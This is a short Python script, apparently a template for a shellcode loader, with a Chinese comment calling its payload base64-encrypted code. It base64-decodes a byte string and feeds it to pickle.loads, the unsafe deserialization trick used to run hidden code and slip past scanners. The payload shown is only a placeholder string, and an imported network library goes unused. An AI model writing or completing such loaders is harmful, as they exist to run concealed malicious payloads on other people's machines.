import base64
import pickle
import requests

# b64加密的code
se_shellcode = b'en-sc-loader'

def deserLoader():
    shellcode = base64.b64decode(se_shellcode)
    pickle.loads(shellcode)

if __name__ == "__main__":
    deserLoader()
